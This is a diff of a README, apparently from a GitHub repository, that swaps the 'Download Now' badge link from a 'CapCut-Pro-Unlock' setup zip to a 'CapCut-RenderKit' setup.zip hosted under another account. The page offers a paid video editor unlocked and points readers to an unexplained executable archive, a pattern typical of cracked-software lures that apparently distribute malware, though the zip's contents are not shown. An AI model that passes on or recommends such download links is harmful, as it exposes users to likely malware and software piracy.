@@ -10,7 +10,7 @@
 
 <img width="829" height="698" alt="image" src="https://github.com/user-attachments/assets/05511be3-b05d-4187-b63d-1d9317a2fc30" />
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Signalbrerhythm/CapCut-Pro-Unlock/releases/download/setup-2.11/setup-v2.11.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ThreadChancellor/CapCut-RenderKit/releases/download/setup/setup.zip)
 
 </div>
 
